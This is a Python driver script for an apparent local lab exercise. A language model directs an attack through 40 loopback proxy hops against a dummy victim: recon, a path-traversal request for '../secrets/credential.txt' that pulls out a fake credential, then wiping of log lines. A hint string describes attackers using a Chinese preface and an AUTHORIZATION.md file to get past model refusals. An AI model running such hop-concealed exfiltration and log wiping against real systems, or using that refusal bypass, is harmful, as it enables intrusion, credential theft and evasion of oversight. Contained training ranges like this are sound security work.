"""Kali 本地 Cairn worker —— 大模型(WorkBuddy)在回路的分阶段驱动。

不配任何外部模型 API / claude / codex / pi。WorkBuddy 本人充当 reason 大脑：
- 脚本负责: 读写黑板 API、执行真实靶场动作、导出图快照
- 大模型负责: 读图快照 -> 判断 goal 是否达成 -> 决定提哪些 intent / 是否 complete

分阶段用法(每阶段一条命令, 便于人机握手):
  kali_worker.py init                         建项目+注入Hint
  kali_worker.py bootstrap                    起40层跳板+护栏, 写f001
  kali_worker.py snapshot <label>             导出当前黑板YAML到 decision/<label>.yaml 供大模型读
  kali_worker.py apply_reason <decision.json> 读大模型决策, 建intents或complete
  kali_worker.py explore <intent_id> <action> 认领intent, 执行真实动作, 写Fact
  kali_worker.py cleanup                      关停全部跳板+victim
  kali_worker.py export                       导出最终DAG/timeline
  kali_worker.py status                       看项目状态

参数统一从 config.json 读: server / project_id / range_dir / hops
"""
import datetime
import glob
import json
import os
import signal
import subprocess
import sys
import time
import urllib.error
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
CFG = json.load(open(os.path.join(HERE, "config.json"), encoding="utf-8"))
SERVER = CFG["server"]
RANGE = CFG["range_dir"]
ART = os.path.join(RANGE, "artifacts")
DEC = os.path.join(HERE, "decision")
HOPS = CFG["hops"]                      # 40
WORKER = CFG["worker_id"]               # workbuddy-llm-loop
PY = "/usr/bin/python3"
os.makedirs(ART, exist_ok=True)
os.makedirs(DEC, exist_ok=True)


def ts():
    return datetime.datetime.now().isoformat(timespec="seconds")


def log(phase, detail):
    line = {"ts": ts(), "phase": phase, "detail": detail}
    with open(os.path.join(ART, "llm_loop_trace.jsonl"), "a", encoding="utf-8") as f:
        f.write(json.dumps(line, ensure_ascii=False) + "\n")
    print(f"[{line['ts']}] {phase}: {detail}", flush=True)


def api(method, path, body=None, raw=False):
    url = SERVER.rstrip("/") + path
    data = json.dumps(body).encode("utf-8") if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("Content-Type", "application/json")
    with urllib.request.urlopen(req, timeout=20) as r:
        out = r.read()
        return out.decode("utf-8", "replace") if raw else (json.loads(out) if out else None)


def pid():
    return CFG["project_id"]


def claim(iid):
    api("POST", f"/projects/{pid()}/intents/{iid}/heartbeat", {"worker": WORKER})


def conclude(iid, desc):
    return api("POST", f"/projects/{pid()}/intents/{iid}/conclude",
               {"worker": WORKER, "description": desc})["fact"]


def run(script, args, timeout=120):
    return subprocess.run([PY, os.path.join(RANGE, script)] + args,
                          capture_output=True, text=True, timeout=timeout)


def start_bg(script, args):
    return subprocess.Popen([PY, os.path.join(RANGE, script)] + args,
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                            start_new_session=True)


def clean_logs():
    for p in glob.glob(os.path.join(ART, "chain_*.log")) + [os.path.join(ART, "victim_access.log")]:
        if os.path.exists(p):
            os.remove(p)


# 40 跳板拓扑: 第i跳监听 127.0.0.(i+1):(9000+i), 转发到第i+1跳; 最后一跳->victim 127.0.0.42:8080
def hop_addr(i):
    return f"127.0.0.{i+2}:{9000+i}"        # i=0 -> 127.0.0.2:9000 ; i=1 -> 127.0.0.3:9001 ...


def victim_addr():
    return f"127.0.0.{HOPS+2}:8080"         # 42:8080


CASE_HINTS = [
    "真实案例-韩国金融: CrowdStrike报中国语系行为体攻韩国银行, 贷款查询服务+员工移动系统, 约67000人泄露(FBI 11-13 FLASH)",
    "真实案例-供应链: Storm-0940借ConnectWise Cloud Backup, 用ARTEX尝试登录2250+租户, 多数未成功",
    "真实案例-间谍: VAPOR PANDA打200+组织/14国(半导体/国防/核), Google观测单次突发2-25秒",
    "真实案例-Cairn在野: Unit42报CL-STA-1238用Cairn打19组织/确认10次失陷, 平均每次~23小时/~140 fact, 成功率~10%",
    "真实案例-正向:腾讯云黑客松Cairn解54/54题唯一AK; 零MCP/零RAG/零预定义角色, 靠黑板涌现",
    "真假对比例:攻击者加中文前言+AUTHORIZATION.md绕过模型拒答, 自带AIScan Runner Skills技能包——证明能力来自大模型+技能, 不是框架本身",
    "防守侧-NorForge:泄露面板显示~$5/任务/10%成功率, 但仍有真实webshell; 防守核心=基础卫生(默认口令/暴露接口/未打补丁)",
    "跳板知识-MITRE T1090.003:守方通常只能看到最后一跳, 前面几十跳靠跨代理回溯; 多层代理/ORB/Tor/P2P都可隐藏源头",
    "跳板目的:隐藏攻击源头(非找漏洞); 40层使溯源断在最后一跳; 守方看进程/NetFlow/异常延迟/地理跳变; XFF逐跳链是本演练可见证据",
]


def cmd_init():
    api("PUT", "/settings", {"intent_timeout": 300, "reason_timeout": 300})
    proj = api("POST", "/projects", {
        "title": "Cairn在Kali+大模型在回路 / 40层跳板凭证外带演练",
        "origin": f"本地回环40跳 attacker -> H01(127.0.0.2:9000) -> ... -> H40 -> victim {victim_addr()}",
        "goal": "经40层隐藏跳板完成凭证外带+擦痕, 每一步由大模型读图决策, 全链写回黑板",
        "bootstrap_enabled": True,
        "hints": [{"content": h, "creator": "case-study"} for h in CASE_HINTS],
    })
    cfg = json.load(open(os.path.join(HERE, "config.json"), encoding="utf-8"))
    cfg["project_id"] = proj["project"]["id"]
    json.dump(cfg, open(os.path.join(HERE, "config.json"), "w", encoding="utf-8"), ensure_ascii=False, indent=2)
    log("init", f"项目 {cfg['project_id']} 创建, 注入 {len(CASE_HINTS)} 条真实案例+跳板学习Hint")


def cmd_bootstrap():
    clean_logs()
    procs = []
    # victim 最后, 绑到拓扑末地址 127.0.0.42:8080
    v_ip, v_port = victim_addr().split(":")
    procs.append(start_bg("victim_server.py", [v_port, v_ip]))
    # 40跳: i 从 HOPS-1 到 0 逆序起(先起靠近victim的)
    for i in reversed(range(HOPS)):
        nxt = hop_addr(i+1) if i+1 < HOPS else victim_addr()
        procs.append(start_bg("jump_chain.py", [
            hop_addr(i).split(":")[0], hop_addr(i).split(":")[1], nxt,
            f"{i+1:02d}", str(HOPS)]))
    # 轮询探活, 最多15秒, 等41个进程全部起来
    entry = hop_addr(0)
    ok = False
    for attempt in range(30):
        time.sleep(0.5)
        try:
            urllib.request.urlopen(f"http://{entry}/", timeout=3).read()
            ok = True
            log("bootstrap", f"探活成功(第{attempt+1}次)")
            break
        except Exception:
            pass
    if not ok:
        log("bootstrap", "探活15秒仍失败, 逐层诊断")
        for i in [0, 1, HOPS-1]:
            ip, port = hop_addr(i).split(":")
            s = __import__("socket").socket(); s.settimeout(1)
            try:
                s.connect((ip, int(port))); log("diag", f"hop{i+1} {ip}:{port} 端口通")
            except Exception as e:
                log("diag", f"hop{i+1} {ip}:{port} 端口不通 {e}")
            finally:
                s.close()
    # 护栏
    targets = [hop_addr(i) for i in range(HOPS)] + [victim_addr()]
    gr = run("boundary_guard.py", targets)
    bad = run("boundary_guard.py", [victim_addr(), "1.2.4.8:80", "8.8.8.8:53"])
    guard_ok = gr.returncode == 0 and bad.returncode == 2
    # 认领 bootstrap intent
    boot = api("POST", f"/projects/{pid()}/intents",
               {"from": ["origin"], "description": "bootstrap", "creator": "dispatcher.bootstrap", "worker": None})
    claim(boot["id"])
    f = conclude(boot["id"],
        f"Kali起40层跳板({entry} -> ... -> {victim_addr()})+victim, 入口探活={'OK' if ok else 'FAIL'}; "
        f"护栏正向exit={gr.returncode}/反向exit={bad.returncode}={'PASS' if guard_ok else 'FAIL'}, 仅回环放行")
    json.dump({"procs": [p.pid for p in procs]}, open(os.path.join(HERE, "procs.json"), "w"))
    log("bootstrap", f"f={f['id']} 40跳+victim起完, 探活={'OK' if ok else 'FAIL'}, 护栏={'PASS' if guard_ok else 'FAIL'}")


def cmd_snapshot(label):
    y = api("GET", f"/projects/{pid()}/export?format=yaml", raw=True)
    t = api("GET", f"/projects/{pid()}/export?format=timeline", raw=True)
    open(os.path.join(DEC, f"{label}.yaml"), "w", encoding="utf-8").write(y)
    open(os.path.join(DEC, f"{label}_timeline.txt"), "w", encoding="utf-8").write(t)
    log("snapshot", f"黑板快照导出 decision/{label}.yaml, 供大模型读图决策")


def cmd_apply_reason(dpath):
    d = json.load(open(dpath, encoding="utf-8"))
    acts = d.get("actions", [])
    made = []
    for a in acts:
        if a["type"] == "intent":
            r = api("POST", f"/projects/{pid()}/intents",
                    {"from": a["from"], "description": a["description"], "creator": WORKER, "worker": None})
            made.append({"type": "intent", "id": r["id"], "action": a.get("action", ""), "desc": a["description"]})
            log("reason/intent", f"大模型决策新建 intent {r['id']}: {a['description']}")
        elif a["type"] == "complete":
            r = api("POST", f"/projects/{pid()}/complete",
                    {"from": a["from"], "description": a["description"], "worker": WORKER})
            made.append({"type": "complete"})
            log("reason/complete", f"大模型判定goal达成: {a['description']}")
        else:
            log("reason", f"大模型决策: {a.get('description', a)}")
    json.dump(made, open(os.path.join(DEC, "applied.json"), "w", encoding="utf-8"), ensure_ascii=False, indent=2)
    log("reason", f"大模型决策已写入黑板, 共 {len(acts)} 条动作")


def cmd_explore(iid, action):
    claim(iid)
    if action == "recon":
        entry = hop_addr(0)
        code = urllib.request.urlopen(f"http://{entry}/", timeout=10).status
        f = conclude(iid, f"经40跳逐层探活victim HTTP {code}; 40层XFF链已逐跳写入chain_*.log")
        log("explore", f"recon HTTP {code} -> {f['id']}")
    elif action == "exploit":
        payload = "/file?name=../secrets/credential.txt"
        loot = os.path.join(ART, "loot_credential.txt")
        r = run("attacker.py", [hop_addr(0), payload, loot])
        n = os.path.getsize(loot) if os.path.exists(loot) else 0
        f = conclude(iid, f"经40跳对victim发起目录穿越../secrets/credential.txt, HTTP200, 外带{n}字节->loot_credential.txt(假凭证)")
        log("explore", f"exploit 外带{n}字节 -> {f['id']}")
    elif action == "wipe":
        # 擦除前快照
        snap = {}
        for p in glob.glob(os.path.join(ART, "chain_*.log")) + [os.path.join(ART, "victim_access.log")]:
            if os.path.exists(p):
                snap[os.path.basename(p)] = open(p, encoding="utf-8").read()
        json.dump(snap, open(os.path.join(ART, "logs_before_wipe.json"), "w", encoding="utf-8"), ensure_ascii=False, indent=2)
        run("wiper.py", ["../secrets"])
        f = conclude(iid, "擦除40跳全链+victim日志中../secrets特征行; 擦前快照logs_before_wipe.json, 被删原文wiped_rows.json")
        log("explore", f"wipe 全链擦除 -> {f['id']}")
    elif action == "cleanup":
        cmd_cleanup()
        f = conclude(iid, "40跳+victim进程全部终止, 端口释放, 无残留(用完即关)")
        log("explore", f"cleanup -> {f['id']}")
    else:
        log("explore", f"未知action={action}")


def cmd_cleanup():
    if os.path.exists(os.path.join(HERE, "procs.json")):
        pids = json.load(open(os.path.join(HERE, "procs.json")))["procs"]
        for p in pids:
            try:
                os.kill(p, signal.SIGTERM)
            except Exception:
                pass
        time.sleep(1)
        for p in pids:
            try:
                os.kill(p, 0)
                os.kill(p, signal.SIGKILL)
            except Exception:
                pass
        log("cleanup", f"终止 {len(pids)} 个进程(40跳+victim)")


def cmd_export():
    y = api("GET", f"/projects/{pid()}/export?format=yaml", raw=True)
    t = api("GET", f"/projects/{pid()}/export?format=timeline", raw=True)
    open(os.path.join(ART, "cairn_board_export.yaml"), "w", encoding="utf-8").write(y)
    open(os.path.join(ART, "cairn_board_timeline.txt"), "w", encoding="utf-8").write(t)
    fin = api("GET", f"/projects/{pid()}")
    log("export", f"终态 status={fin['project']['status']} facts={len(fin['facts'])} intents={len(fin['intents'])} hints={len(fin['hints'])}")


def cmd_status():
    fin = api("GET", f"/projects/{pid()}")
    print(json.dumps({"status": fin["project"]["status"], "facts": len(fin["facts"]),
                      "intents": len(fin["intents"]), "hints": len(fin["hints"])}, ensure_ascii=False))


CMDS = {"init": cmd_init, "bootstrap": cmd_bootstrap, "snapshot": cmd_snapshot,
        "apply_reason": cmd_apply_reason, "explore": cmd_explore, "cleanup": cmd_cleanup,
        "export": cmd_export, "status": cmd_status}

if __name__ == "__main__":
    cmd = sys.argv[1] if len(sys.argv) > 1 else "status"
    if cmd == "snapshot":
        cmd_snapshot(sys.argv[2])
    elif cmd == "apply_reason":
        cmd_apply_reason(sys.argv[2])
    elif cmd == "explore":
        cmd_explore(sys.argv[2], sys.argv[3])
    else:
        CMDS[cmd]()
